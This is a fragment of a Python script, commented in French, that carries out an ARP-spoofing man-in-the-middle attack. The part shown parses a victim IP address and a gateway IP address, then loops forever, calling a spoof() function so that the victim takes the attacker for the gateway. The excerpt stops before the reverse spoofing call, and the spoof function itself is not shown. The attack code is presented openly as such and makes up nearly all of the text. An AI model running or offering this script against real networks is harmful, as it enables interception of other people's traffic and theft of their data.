...
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script Man-in-the-Middle ARP")
    parser.add_argument("target", help="Adresse IP de la victime (PC1)")
    parser.add_argument("gateway", help="Adresse IP de la passerelle")
    
    args = parser.parse_args()
    
    try:
        while True:
            # Usurper la passerelle auprès de PC1
            spoof(args.target, args.gateway)
            # Usurper PC1 auprès de la passerelle
